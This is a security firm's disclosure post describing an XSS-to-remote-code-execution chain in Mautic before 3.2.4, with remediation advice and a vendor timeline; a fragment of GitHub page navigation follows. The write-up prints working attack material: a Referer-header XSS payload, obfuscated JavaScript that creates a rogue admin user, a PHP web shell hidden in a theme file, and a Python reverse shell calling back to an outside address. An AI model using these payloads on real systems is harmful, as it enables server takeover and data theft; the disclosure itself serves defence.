=== Content from www.horizon3.ai_4fb2ac8d_20250119_111802.html ===


[Skip to main content](#brx-content)
[Skip to footer](#brx-footer)
[![Renmoe Library](https://www.horizon3.ai/wp-content/uploads/2024/11/Horizon3ai_Logo_Tagline_Horizontal_RGB-WhiteTxt_NoTag.png)](https://www.horizon3.ai)

* Solutions
  + Security Strategies
  + [→ Effective Security](/effectivesecurity)
  + [→ Splunk Logging](https://www.horizon3.ai/for-splunk/)
  + [→ Purple Team Culture](https://www.horizon3.ai/purple-team-culture/)
  + [→ Vulnerable ≠ Exploitable](https://www.horizon3.ai/vulnerable-not-exploitable/)
  + [NodeZero for Compliance](https://www.horizon3.ai/compliance/)
  + [→ PCI Complinace](https://www.horizon3.ai/compliance/pci-pentesting/)
  + [→ NIS 2 Compliance](https://www.horizon3.ai/compliance/nis-2-compliance/)
  + [The NodeZero™ Platform](https://www.horizon3.ai/nodezero/)
  + [→ Internal Pentesting](https://www.horizon3.ai/nodezero/continuous-internal-pentesting/)
  + [→ External Pentesting](https://www.horizon3.ai/nodezero/external-pentesting/)
  + [→ Kubernetes Pentesting](https://www.horizon3.ai/nodezero/kubernetes-pentesting/)
  + [→ Cloud Pentesting](https://www.horizon3.ai/nodezero/cloud-pentesting/)
  + [→ Rapid Response](https://www.horizon3.ai/nodezero/rapid-response/)
  + [→ NodeZero Insights](https://www.horizon3.ai/nodezero/insights/)
  + [→ AD Password Audit](https://www.horizon3.ai/nodezero/nodezero-ad-password-audit/)
  + [→ Phishing Impact Testing](https://www.horizon3.ai/nodezero/phishing-impact-testing/)
  + [→ NodeZero Tripwires](https://www.horizon3.ai/nodezero/nodezero-tripwires/)
  + [Documentation](https://docs.horizon3.ai/getting_started/)
  + Use Cases
  + [→ Public Sector](https://www.horizon3.ai/use-case/nodezero-in-the-public-sector/)
  + [→ Education](https://www.horizon3.ai/use-case/nodezero-in-education/)
  + [→ Healthcare](https://www.horizon3.ai/use-case/for-healthcare/)
  + [→ Manufacturing](https://www.horizon3.ai/use-case/nodezero-in-manufacturing/)
  + [→ Financial Services](https://www.horizon3.ai/downloads/whitepapers/unlock-proactive-cybersecurity/)
  + [→ Supply Chain](https://www.horizon3.ai/use-case/nodezero-for-supply-chain/)
  + [→ Large Organizations](/who-uses-nodezero#large-org)
  + [→ MSSP and MSP](https://www.horizon3.ai/partners/mssp-msp/)
  + [Who Uses NodeZero?](https://www.horizon3.ai/who-uses-nodezero/)
  + [→ ITOps and SecOps](/who-uses-nodezero#itops)
  + [→ Security Teams](/who-uses-nodezero#security-teams)
  + [→ Pentesters](/who-uses-nodezero#pentesters)
* Partners
  + [MSSPs and MSPs](https://www.horizon3.ai/partners/mssp-msp/)
  + [Partners](https://www.horizon3.ai/partners/)
  + [Become A Partner](https://www.horizon3.ai/partners#become-a-partner-form)
  + [Partner Portal](https://partners.horizon3.ai/)
* Resources
  + [Resource Center](https://www.horizon3.ai/resource-center/)
  + [Attack Research](https://www.horizon3.ai/category/attack-research/)
  + [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Customer Stories](https://www.horizon3.ai/category/customer-story/)
  + [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
  + [Credential Attacks](https://www.horizon3.ai/credentialattacks/)
  + [Log4Shell](https://www.horizon3.ai/log4shell/)
  + [Ransomware Impact](https://www.horizon3.ai/ransomware/)
  + [Glossary](https://www.horizon3.ai/resource-center/glossary/)
  + [Prove the impact of cybersecurity investments—holistically and continuously](https://www.horizon3.ai/intelligence/webinars/prove-the-impact-of-cybersecurity-investments-holistically-and-continuously/)

    January 14, 2025  |  [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
  + [The Death of BAS and the Rise of Autonomous Pentesting](https://www.horizon3.ai/intelligence/blogs/the-death-of-bas-and-the-rise-of-autonomous-pentesting/)

    January 13, 2025  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Critical Vulnerabilities in SimpleHelp Remote Support Software](https://www.horizon3.ai/attack-research/disclosures/critical-vulnerabilities-in-simplehelp-remote-support-software/)

    January 13, 2025  |  [Attack Blogs](https://www.horizon3.ai/category/attack-research/attack-blogs/), [Disclosures](https://www.horizon3.ai/category/attack-research/disclosures/)
  + [Simplify Compliance with NodeZero: CMMC, DFARS, and NIST 800-171](https://www.horizon3.ai/intelligence/blogs/simplify-compliance-with-nodezero-cmmc-dfars-and-nist-800-171/)

    January 6, 2025  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
* Company
  + [Our Vision](https://www.horizon3.ai/horizon3-security-vision/)
  + [Meet The Team](https://www.horizon3.ai/about-us/)
  + [Join The Team](https://www.horizon3.ai/join-our-team/)
  + [Awards](https://www.horizon3.ai/category/news/awards/)
  + [Press Releases](https://www.horizon3.ai/category/news/press-release/)
  + [Contact Us](https://www.horizon3.ai/contact-us/)
  + [Upcoming Events](https://www.horizon3.ai/events/)
* [Log In](https://portal.horizon3ai.com/)
* Try NodeZero
  + [Get A Demo](https://www.horizon3.ai/contact-us/schedule-demo/)
  + [Free Trial](https://portal.horizon3ai.com/)

* Solutions
  + Security Strategies
  + [→ Effective Security](/effectivesecurity)
  + [→ Splunk Logging](https://www.horizon3.ai/for-splunk/)
  + [→ Purple Team Culture](https://www.horizon3.ai/purple-team-culture/)
  + [→ Vulnerable ≠ Exploitable](https://www.horizon3.ai/vulnerable-not-exploitable/)
  + [NodeZero for Compliance](https://www.horizon3.ai/compliance/)
  + [→ PCI Complinace](https://www.horizon3.ai/compliance/pci-pentesting/)
  + [→ NIS 2 Compliance](https://www.horizon3.ai/compliance/nis-2-compliance/)
  + [The NodeZero™ Platform](https://www.horizon3.ai/nodezero/)
  + [→ Internal Pentesting](https://www.horizon3.ai/nodezero/continuous-internal-pentesting/)
  + [→ External Pentesting](https://www.horizon3.ai/nodezero/external-pentesting/)
  + [→ Kubernetes Pentesting](https://www.horizon3.ai/nodezero/kubernetes-pentesting/)
  + [→ Cloud Pentesting](https://www.horizon3.ai/nodezero/cloud-pentesting/)
  + [→ Rapid Response](https://www.horizon3.ai/nodezero/rapid-response/)
  + [→ NodeZero Insights](https://www.horizon3.ai/nodezero/insights/)
  + [→ AD Password Audit](https://www.horizon3.ai/nodezero/nodezero-ad-password-audit/)
  + [→ Phishing Impact Testing](https://www.horizon3.ai/nodezero/phishing-impact-testing/)
  + [→ NodeZero Tripwires](https://www.horizon3.ai/nodezero/nodezero-tripwires/)
  + [Documentation](https://docs.horizon3.ai/getting_started/)
  + Use Cases
  + [→ Public Sector](https://www.horizon3.ai/use-case/nodezero-in-the-public-sector/)
  + [→ Education](https://www.horizon3.ai/use-case/nodezero-in-education/)
  + [→ Healthcare](https://www.horizon3.ai/use-case/for-healthcare/)
  + [→ Manufacturing](https://www.horizon3.ai/use-case/nodezero-in-manufacturing/)
  + [→ Financial Services](https://www.horizon3.ai/downloads/whitepapers/unlock-proactive-cybersecurity/)
  + [→ Supply Chain](https://www.horizon3.ai/use-case/nodezero-for-supply-chain/)
  + [→ Large Organizations](/who-uses-nodezero#large-org)
  + [→ MSSP and MSP](https://www.horizon3.ai/partners/mssp-msp/)
  + [Who Uses NodeZero?](https://www.horizon3.ai/who-uses-nodezero/)
  + [→ ITOps and SecOps](/who-uses-nodezero#itops)
  + [→ Security Teams](/who-uses-nodezero#security-teams)
  + [→ Pentesters](/who-uses-nodezero#pentesters)
* Partners
  + [MSSPs and MSPs](https://www.horizon3.ai/partners/mssp-msp/)
  + [Partners](https://www.horizon3.ai/partners/)
  + [Become A Partner](https://www.horizon3.ai/partners#become-a-partner-form)
  + [Partner Portal](https://partners.horizon3.ai/)
* Resources
  + [Resource Center](https://www.horizon3.ai/resource-center/)
  + [Attack Research](https://www.horizon3.ai/category/attack-research/)
  + [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Customer Stories](https://www.horizon3.ai/category/customer-story/)
  + [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
  + [Credential Attacks](https://www.horizon3.ai/credentialattacks/)
  + [Log4Shell](https://www.horizon3.ai/log4shell/)
  + [Ransomware Impact](https://www.horizon3.ai/ransomware/)
  + [Glossary](https://www.horizon3.ai/resource-center/glossary/)
  + [Prove the impact of cybersecurity investments—holistically and continuously](https://www.horizon3.ai/intelligence/webinars/prove-the-impact-of-cybersecurity-investments-holistically-and-continuously/)

    January 14, 2025  |  [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
  + [The Death of BAS and the Rise of Autonomous Pentesting](https://www.horizon3.ai/intelligence/blogs/the-death-of-bas-and-the-rise-of-autonomous-pentesting/)

    January 13, 2025  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Critical Vulnerabilities in SimpleHelp Remote Support Software](https://www.horizon3.ai/attack-research/disclosures/critical-vulnerabilities-in-simplehelp-remote-support-software/)

    January 13, 2025  |  [Attack Blogs](https://www.horizon3.ai/category/attack-research/attack-blogs/), [Disclosures](https://www.horizon3.ai/category/attack-research/disclosures/)
  + [Simplify Compliance with NodeZero: CMMC, DFARS, and NIST 800-171](https://www.horizon3.ai/intelligence/blogs/simplify-compliance-with-nodezero-cmmc-dfars-and-nist-800-171/)

    January 6, 2025  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
* Company
  + [Our Vision](https://www.horizon3.ai/horizon3-security-vision/)
  + [Meet The Team](https://www.horizon3.ai/about-us/)
  + [Join The Team](https://www.horizon3.ai/join-our-team/)
  + [Awards](https://www.horizon3.ai/category/news/awards/)
  + [Press Releases](https://www.horizon3.ai/category/news/press-release/)
  + [Contact Us](https://www.horizon3.ai/contact-us/)
  + [Upcoming Events](https://www.horizon3.ai/events/)
* [Log In](https://portal.horizon3ai.com/)
* Try NodeZero
  + [Get A Demo](https://www.horizon3.ai/contact-us/schedule-demo/)
  + [Free Trial](https://portal.horizon3ai.com/)
# Unauthenticated XSS to Remote Code Execution Chain in Mautic < 3.2.4

Horizon3.ai  |  January 24, 2021  |  [Disclosures](https://www.horizon3.ai/category/attack-research/disclosures/)
## Summary

[Mautic](https://www.mautic.org/) is widely used open source software for marketing automation. While researching the application and its source code on [Github](https://github.com/mautic/mautic), we discovered an attack chain whereby an unauthenticated attacker could gain remote code execution privileges on the server hosting Mautic by abusing a stored XSS vulnerability. The issues raised in this post, [CVE-2020-35124](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35124) and [CVE-2020-35125](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35124), have been fixed in Mautic 3.2.4.

## Impact

Critical. Unauthenticated attackers could gain admin privileges leading to remote code execution on the server hosting Mautic.

As of this writing, there are about 6K instances of Mautic that can be found with the Shodan dork “html: Mautic”.

![](https://www.horizon3.ai/wp-content/uploads/2022/03/mautic_xss_to_rce_shodan_379b70ac55.png)

## Remediation

Update to the [latest version of Mautic](https://github.com/mautic/mautic/releases).

## Discovery

As a marketing automation platform, Mautic allows its users to collect leads and track their engagement with different types of content. For the sake of this post, there are two types of content that are of interest: assets and forms. An “asset” is simply a file that a lead can download. A lead is given a link to download an asset, and when the lead clicks on it, the asset is downloaded directly from the Mautic application. A form is something that a Mautic user can set up to be hosted by Mautic or a third-party site. When a lead fills out the form and submits it, the form is submitted back via an API call to the Mautic application.

This is interesting because it means the attack surface for Mautic is broader than a typical web application – you not only have to consider users in Mautic who authenticate normally to the web application but also unauthenticated leads that interact with the web application via external content.

As we were looking at the Mautic interface, we looked for data that could be influenced by leads, and one of the things that stood out is that Referrer information is surfaced in a number of places. A “referrer” is the third-party site a lead is coming from when they download an asset or submit a form. Mautic tracks this by capturing and storing the HTTP Referer header whenever a lead clicks on a download link or submits a form. For instance, the “Downloads of all Assets” report page shows the “Top Referrers”:

![](https://www.horizon3.ai/wp-content/uploads/2022/03/mautic_xss_to_rce_top_referrers_2ef8678f26.png)

While browsers automatically set the HTTP Referer header based on the web site someone is on, there is nothing preventing someone from manipulating this header. It was discovered that a malicious “lead” (i.e. an unauthenticated attacker) could supply an HTTP Referer header with an XSS payload, which would then be stored by Mautic. If a legitimate user in Mautic then viewed a page where referrer data is surfaced, the XSS payload would fire, and the malicious “lead” could execute arbitrary Javascript in the context of the Mautic user.

Here’s an example of a simple XSS payload sent against a public asset download link.

```
sh-3.2# curl -o test.pdf -v 'http://192.168.0.116/asset/1:testpdf' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H $'Referer: http://<img/src="doesnotexist.jpg"onerror="eval(window.atob(\'YWxlcnQoJ3hzcycp\'))">'
```

This base64-encoded payload inside the eval decodes to `"alert('xss')"`.

When a legitimate Mautic user accesses the “Download of All Assets” page, he/she would see this:

![](https://www.horizon3.ai/wp-content/uploads/2022/03/mautic_xss_to_rce_alert_xss_efcffd1e25.png)

For a Mautic form, it was found that the `mautic[return]` form variable contained referrer information and was vulnerable to XSS payload injection, in much the same way as the HTTP Referer header.

## End-to-end Exploitation

Getting a window with “xss” to popup is ok but we wanted to take it it further.

### Identifying Assets and Forms

Starting from the beginning, the first thing an attacker looking at a Mautic site needs to be able to do is identify forms and assets to target. This is straightforward to accomplish because forms and assets are identified by auto-incrementing integers. To identify a Mautic form or asset, an attacker simply has to sequentially enumerate forms and assets by an integer id to find one that is valid. This type of weakness is known as [Insecure Direct Object Reference (IDOR)](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html). This is something which by itself is not a serious problem unless there are other application vulnerabilities present.

For Mautic assets specifically, the full download URL includes the asset’s “alias,” which is its short name. It was found however that if you ask Mautic for the asset id following only by a “:”, Mautic would automatically redirect to the full asset download URL, as can be seen in the Location header below. In this way an attacker can fully enumerate assets with no prior knowledge. Enumerating Mautic forms doesn’t require this extra step.

```
sh-3.2# curl -v http://192.168.0.116/asset/1:
*   Trying 192.168.0.116...
* TCP_NODELAY set
* Connected to 192.168.0.116 (192.168.0.116) port 80 (#0)
> GET /asset/1: HTTP/1.1
> Host: 192.168.0.116
> User-Agent: curl/7.64.1
> Accept: */*
>
< HTTP/1.1 301 Moved Permanently
< Date: Sat, 16 Jan 2021 18:11:30 GMT
< Server: Apache
< X-Powered-By: PHP/7.3.25
< X-Frame-Options: SAMEORIGIN
< Vary: Cookie
< Location: /asset/1:testpdf
< Transfer-Encoding: chunked
< Content-Type: text/html; charset=UTF-8
<
< ... TRUNCATED ... >
```
### Creating an Admin User

With an asset or form identified, an attacker can craft an XSS payload. We wanted to construct an XSS payload that would automatically create an admin user when a legitimate Mautic admin user was viewing the “Downloads of all Assets” report.

Creating an admin user in the Mautic interface is done on the “Users – New User” page, show below.

![](https://www.horizon3.ai/wp-content/uploads/2022/03/mautic_xss_to_rce_new_user_c7c5458a6b.png)

This page is protected by two tokens: an Ajax CSRF token and a user CSRF token. So the first step in the XSS payload is to fetch the “Users – New User” page and extract the CSRF tokens. The following bit of code does that:

```
function getTokens() {
    xhttp = new XMLHttpRequest();
    xhttp.open('GET', '/s/users/new', false)
    xhttp.send();
    t=xhttp.responseText;
    csrfToken = t.split('mauticAjaxCsrf')[1].split("'")[1].split("'")[0];
    userToken = t.split('name="user[_token]"')[1].split('value="')[1].split('"')[0];
    return [csrfToken, userToken]
}
```

The next step is to then create a user with admin privileges. This can be done as follows:

```
function createUser(tokens) {
    xcreate = new XMLHttpRequest();
    xcreate.open('POST', '/s/users/new', false);
    xcreate.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xcreate.setRequestHeader('X-CSRF-Token', tokens[0]);
    payload='user%5BfirstName%5D=Mautic-IT&user%5BlastName%5D=User&user%5Brole%5D=1&user%5Bposition%5D=&user%5Bsignature%5D=Best+regards%2C+%7CFROM_NAME%7C&user%5Busername%5D=mautic-it&user%5Bemail%5D=mautic-it%40example.com&user%5BplainPassword%5D%5Bpassword%5D=test123&user%5BplainPassword%5D%5Bconfirm%5D=test123&user%5Btimezone%5D=&user%5Blocale%5D=&user%5BisPublished%5D=1&user%5Bbuttons%5D%5Bsave%5D=&user%5B_token%5D=' + tokens[1];
    xcreate.send(payload);
}
createUser(getTokens());
```

The above code creates a user with username `mautic-it` with the password `test123` and assigns it the admin role.

We wrapped this up into an XSS payload:

```
sh-3.2# curl -o test.pdf -v 'http://192.168.0.116/asset/1:testpdf' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H $'Referer: http://<img/src="doesnotexist.jpg"onerror="eval(window.atob(\'ZnVuY3Rpb24gZ2V0VG9rZW5zKCkgewogICAgeGh0dHAgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKICAgIHhodHRwLm9wZW4oJ0dFVCcsICcvcy91c2Vycy9uZXcnLCBmYWxzZSkKICAgIHhodHRwLnNlbmQoKTsKICAgIHQ9eGh0dHAucmVzcG9uc2VUZXh0OwogICAgY3NyZlRva2VuID0gdC5zcGxpdCgnbWF1dGljQWpheENzcmYnKVsxXS5zcGxpdCgiJyIpWzFdLnNwbGl0KCInIilbMF07CiAgICB1c2VyVG9rZW4gPSB0LnNwbGl0KCduYW1lPSJ1c2VyW190b2tlbl0iJylbMV0uc3BsaXQoJ3ZhbHVlPSInKVsxXS5zcGxpdCgnIicpWzBdOwogICAgcmV0dXJuIFtjc3JmVG9rZW4sIHVzZXJUb2tlbl0KfQpmdW5jdGlvbiBjcmVhdGVVc2VyKHRva2VucykgewogICAgeGNyZWF0ZSA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgeGNyZWF0ZS5vcGVuKCdQT1NUJywgJy9zL3VzZXJzL25ldycsIGZhbHNlKTsKICAgIHhjcmVhdGUuc2V0UmVxdWVzdEhlYWRlcignQ29udGVudC10eXBlJywgJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcpOwogICAgeGNyZWF0ZS5zZXRSZXF1ZXN0SGVhZGVyKCdYLUNTUkYtVG9rZW4nLCB0b2tlbnNbMF0pOwogICAgcGF5bG9hZD0ndXNlciU1QmZpcnN0TmFtZSU1RD1NYXV0aWMtSVQmdXNlciU1Qmxhc3ROYW1lJTVEPVVzZXImdXNlciU1QnJvbGUlNUQ9MSZ1c2VyJTVCcG9zaXRpb24lNUQ9JnVzZXIlNUJzaWduYXR1cmUlNUQ9QmVzdCtyZWdhcmRzJTJDKyU3Q0ZST01fTkFNRSU3QyZ1c2VyJTVCdXNlcm5hbWUlNUQ9bWF1dGljLWl0JnVzZXIlNUJlbWFpbCU1RD1tYXV0aWMtaXQlNDBleGFtcGxlLmNvbSZ1c2VyJTVCcGxhaW5QYXNzd29yZCU1RCU1QnBhc3N3b3JkJTVEPXRlc3QxMjMmdXNlciU1QnBsYWluUGFzc3dvcmQlNUQlNUJjb25maXJtJTVEPXRlc3QxMjMmdXNlciU1QnRpbWV6b25lJTVEPSZ1c2VyJTVCbG9jYWxlJTVEPSZ1c2VyJTVCaXNQdWJsaXNoZWQlNUQ9MSZ1c2VyJTVCYnV0dG9ucyU1RCU1QnNhdmUlNUQ9JnVzZXIlNUJfdG9rZW4lNUQ9JyArIHRva2Vuc1sxXTsKICAgIHhjcmVhdGUuc2VuZChwYXlsb2FkKTsKfQpjcmVhdGVVc2VyKGdldFRva2VucygpKTs=\'))">'
```

The code is ugly but it works. (In practice an attacker would likely use a payload that connects to an attacker controlled site to retrieve commands to execute.) When a legitimate Mautic admin-level user views the “Top Referrers” report, the XSS payload fires and creates another admin user:

![](https://www.horizon3.ai/wp-content/uploads/2022/03/mautic_xss_to_rce_network_tab_b38ef462ea.png)

![](https://www.horizon3.ai/wp-content/uploads/2022/03/mautic_xss_to_rce_bad_user_8c17e91317.png)

### Remote Code Execution via a Custom Theme

Admin access to complex web applications often results in gaining remote code execution privileges on the server hosting the application. With Mautic, we found it was possible to get RCE by uploading a malicious custom theme. This is not a vulnerability per se but a feature of the application that can be abused by an attacker. This is a common attack vector in many CMS applications.

The [Mautic documentation](https://developer.mautic.org/#themes) describes a method to create themes containing custom form fields. The description of the form field is given by a PHP file inside a theme zip file. This is a natural location to embed a web shell.

Mautic has several built-in themes. We modified the the built-in Cards theme located [in Github here](https://github.com/mautic/mautic/tree/features/themes/cards) and added a file called `date.html.php` with a custom field called “Date” and a web shell:

```
<?php
echo shell_exec($_GET['cmd'].' 2>&1');
echo $view->render(
'MauticFormBundle:Field:text.html.php',
[
'field' => $field,
 'inForm' => (isset($inForm)) ? $inForm : false,
'type' => 'date',
'id' => $id,
'formId' => (isset($formId)) ? $formId : 0,
'formName' => (isset($formName)) ? $formName : '',
]
);
```

This was zipped into a file called `bad-theme.zip` with the following structure:

```
sh-3.2# unzip -l bad-theme.zip
Archive: bad-theme.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      118  12-07-2020 23:10   config.json
        0  12-07-2020 21:46   html/
      263  12-07-2020 21:46   html/message.html.twig
      393  12-07-2020 21:46   html/base.html.twig
        0  12-07-2020 22:56   html/MauticFormBundle/
        0  12-07-2020 22:56   html/MauticFormBundle/Field/
      583  12-07-2020 22:56   html/MauticFormBundle/Field/date.html.php
        0  12-07-2020 21:46   html/MauticFormBundle/Builder/
     2071  12-07-2020 21:46   html/MauticFormBundle/Builder/style.html.twig
    51320  12-07-2020 21:46   html/email.html.twig
    44004  12-07-2020 21:46   thumbnail.png
        0  12-07-2020 21:46   assets/
     2269  12-07-2020 21:46   assets/logo_black.png
   141389  12-07-2020 21:46   assets/background_look.jpg
   115977  12-07-2020 21:46   assets/placeholder_coffee.jpg
   302632  12-07-2020 21:46   assets/placeholder_coffee.png
   105452  12-07-2020 21:46   assets/background_face.jpg
     1517  12-07-2020 21:46   assets/icon_social.png
        0  12-07-2020 21:46   assets/open-sans/
   101756  12-07-2020 21:46   assets/open-sans/OpenSans-SemiBold.WOFF
   221164  12-07-2020 21:46   assets/open-sans/OpenSans-SemiBold.ttf
    97828  12-07-2020 21:46   assets/open-sans/OpenSans-SemiBoldItalic.WOFF
   212760  12-07-2020 21:46   assets/open-sans/OpenSans-Italic.ttf
    97180  12-07-2020 21:46   assets/open-sans/OpenSans-Italic.WOFF
   212732  12-07-2020 21:46   assets/open-sans/OpenSans-SemiBoldItalic.ttf
    99416  12-07-2020 21:46   assets/open-sans/OpenSans-Regular.WOFF
   217276  12-07-2020 21:46   assets/open-sans/OpenSans-Regular.ttf
---------                     -------
  2028100                     27 files

```

To activate the theme, we first modified the Mautic theme configuration to allow PHP files to be uploaded.

![](https://www.horizon3.ai/wp-content/uploads/2022/03/mautic_xss_to_rce_allow_php_files_in_themes_006170ea6f.png)

Then we uploaded the theme zip file:

![](https://www.horizon3.ai/wp-content/uploads/2022/03/mautic_xss_to_rce_upload_theme_874994f1a9.png)

And enabled it:

![](https://www.horizon3.ai/wp-content/uploads/2022/03/mautic_xss_to_rce_enable_theme_6588ee2be6.png)

To activate the web shell, we first created a form with our custom Date field, and went back in to edit it. The web shell is active on the `/s/forms/edit/<form_id>` page. Below we dump the contents of the `/etc/passwd` file on the Mautic server.

![](https://www.horizon3.ai/wp-content/uploads/2022/03/mautic_xss_to_rce_webshell_cbc7615392.png)

And upgrading to a reverse shell using a Python reverse shell:

```
http://192.168.0.116/s/forms/edit/1?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22192.168.0.105%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B%27
```

![](https://www.horizon3.ai/wp-content/uploads/2022/03/mautic_xss_to_rce_reverse_shell_25b8b9a429.png)

From here, an attacker can do any number of things. A common target in cloud environments would be to enumerate cloud metadata URLs to pilfer access keys. In a hybrid cloud scenario, an attacker could pivot into a victim’s internal network if proper network segmentation controls aren’t in place.

## Timeline

* Dec. 7, 2020: Vulnerability disclosed to vendor
* Dec. 8, 2020: Vulnerability confirmed by vendor
* Dec. 17, 2020: Vendor conveys patch timeline
* Jan. 14, 2021: Patch released and public disclosure

Thanks to the Mautic security team for their prompt response and handling of the issues raised in this post.

## References

* <https://github.com/mautic/mautic/security/advisories>
* <https://www.mautic.org/blog/community/security-release-all-versions-mautic-prior-2-16-5-and-3-2-4>
* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35124>
* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35125>
##### How can NodeZero help you?

Let our experts walk you through a demonstration of NodeZero, so you can see how to put it to work for your company.[Get a Demo](https://www.horizon3.ai/contact-us/schedule-demo/)Share:

[![Renmoe Library](https://www.horizon3.ai/wp-content/uploads/2021/06/h3-white-logo.png)](https://www.horizon3.ai)Contact Us

### Subscribe to Community Updates

###### NodeZero Solution

* [NodeZero Overview](https://www.horizon3.ai/nodezero/)
* [Internal Pentesting](https://www.horizon3.ai/nodezero/continuous-internal-pentesting/)
* [Kubernetes Pentesting](https://www.horizon3.ai/nodezero/kubernetes-pentesting/)
* [External Pentesting](https://www.horizon3.ai/nodezero/external-pentesting/)
* [Cloud Pentesting](https://www.horizon3.ai/nodezero/cloud-pentesting/)
* [NodeZero Insights](https://www.horizon3.ai/nodezero/insights/)
* [Rapid Response](https://www.horizon3.ai/nodezero/rapid-response/)
* [AD Password Audit](https://www.horizon3.ai/nodezero/nodezero-ad-password-audit/)
* [Phishing Impact Testing](https://www.horizon3.ai/nodezero/phishing-impact-testing/)
* [NodeZero Tripwires](https://www.horizon3.ai/nodezero/nodezero-tripwires/)
* [NodeZero Documentation](https://docs.horizon3.ai/getting_started/)
* [Pentesting for Compliance](https://www.horizon3.ai/compliance/)
* [Pentesting for PCI Compliance](https://www.horizon3.ai/compliance/pci-pentesting/)
* [Pentesting for NIS 2 Compliance](https://www.horizon3.ai/compliance/nis-2-compliance/)
###### Resources

* [Blog](https://www.horizon3.ai/category/intelligence/blogs/)
* [Attack Research](https://www.horizon3.ai/category/attack-research/)
* [White Papers](https://www.horizon3.ai/category/downloads/whitepapers/)
* [Fact Sheets](https://www.horizon3.ai/category/downloads/factsheets/)
* [Case Studies](https://www.horizon3.ai/category/customer-story/)
* [Glossary](https://www.horizon3.ai/resource-center/glossary/)
###### Use Cases

* [Education](https://www.horizon3.ai/use-case/nodezero-in-education/)
* [Healthcare](https://www.horizon3.ai/use-case/for-healthcare/)
* [Manufacturing](https://www.horizon3.ai/use-case/nodezero-in-manufacturing/)
* [Public Sector](https://www.horizon3.ai/use-case/nodezero-in-the-public-sector/)
* [Supply Chain](https://www.horizon3.ai/use-case/nodezero-for-supply-chain/)
* [Financial Services](https://www.horizon3.ai/downloads/whitepapers/unlock-proactive-cybersecurity/)
* [Large Organization](/who-uses-nodezero/#large-org/)
* [MSSPs and MSPs](https://www.horizon3.ai/partners/mssp-msp/)
* [DIB Suppliers](https://www.horizon3.ai/nsa-capt-program-for-dib-suppliers/)
* [On AWS Marketplace](https://www.horizon3.ai/horizon3-ai-and-aws/)
###### Roles

* [ITOps and SecOps](/who-uses-nodezero/#itops)
* [Security Teams](/who-uses-nodezero/#security-teams)
* [Consulting Pentester](/who-uses-nodezero/#pentesters)
###### Partners

* MSSPs and MSPs
* [Become a Partner](https://www.horizon3.ai/partners/)
* [Partner Portal](https://partners.horizon3.ai/)
###### Company

* [About Us](https://www.horizon3.ai/about-us/)
* [Careers](https://www.horizon3.ai/join-our-team/)
* [Press](https://www.horizon3.ai/category/news/press-release/)
* [Awards](https://www.horizon3.ai/category/news/awards/)
* [Contact](https://www.horizon3.ai/contact-us/)
* [Upcoming Events](https://www.horizon3.ai/events/)
© 2024 All Rights Reserved.
[Privacy Policy](https://www.horizon3.ai/privacy-policy/)[Support Policy](https://www.horizon3.ai/support-policy/)[Terms of Service](https://www.horizon3.ai/terms-of-service/)[Trust Center](https://trust.horizon3.ai/)



=== Content from github.com_73b1581e_20250119_111801.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmautic%2Fmautic%2Fsecurity%2Fadvisories%2FGHSA-39wj-j3jc-858m)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
